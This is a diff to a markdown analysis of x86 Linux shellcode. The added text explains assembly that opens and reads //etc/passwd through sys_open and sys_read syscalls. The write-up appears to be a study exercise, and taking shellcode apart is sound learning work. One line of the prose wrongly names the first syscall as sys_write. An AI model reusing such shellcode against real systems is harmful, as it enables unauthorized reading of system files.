@@ -48,14 +48,28 @@ Analysis:
 
 As usual, the shellcode starts by clearing out the ecx register, then it moves the linux `sys_write` syscall into the al register. Then the shellcode pushes the string `//etc/passwd` onto the stack in little endian format and split up.
 
+**Clearing the registers** Using XOR ECX, ECX we can have the ECX register cleared by turning it to 0x00000000. Then using mul ecx to `EDX:EAX = EAX * ECX` which will then clear EAX and EDX
 ```assembly
 xor    ecx,ecx        ; clear out ecx as prep
-mul    ecx            ; 
+mul    ecx            ;
+```
+**Open the file** Moving 0x05 into al is using the sys_open linux syscall, sys_open requires 3 arguments, path in EBX, flags on ECX, and MODE on EDX
+```assembly
 mov    al,0x5         ; linux syscall (sys_open, 0x05)
 push   ecx
 push   0x64777373     ; push 'dwss' to the stack
 push   0x61702f63     ; push 'ap/c' to the stack
 push   0x74652f2f     ; push 'te//' to the stack
-mov    ebx,esp
+mov    ebx,esp        ; putting the address and "location" of the file into ebx
 int    0x80           ; sys interupt
+```
+
+```assembly
+xchg eax,ebx
+xchg eax,ecx
+mov al,0x3
+xor edx,edx
+mov dx,0xfff
+inc edx
+int 0x80
 ```
